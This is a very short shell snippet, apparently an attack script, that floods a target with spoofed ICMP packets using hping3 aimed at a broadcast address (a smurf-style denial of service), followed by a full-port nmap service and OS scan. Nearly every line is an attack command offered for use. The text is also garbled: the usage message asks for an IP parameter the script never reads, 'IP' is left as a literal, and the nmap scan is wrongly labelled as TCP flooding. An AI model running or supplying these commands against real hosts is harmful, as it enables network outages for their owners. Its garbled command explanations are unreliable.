echo "Usage: pass 1st parameter as IP address to flood"
hping3 -1 --flood --spoof IP 172.24.235.255

For tcp flooding:
nmap -sV -O IP -p- -v
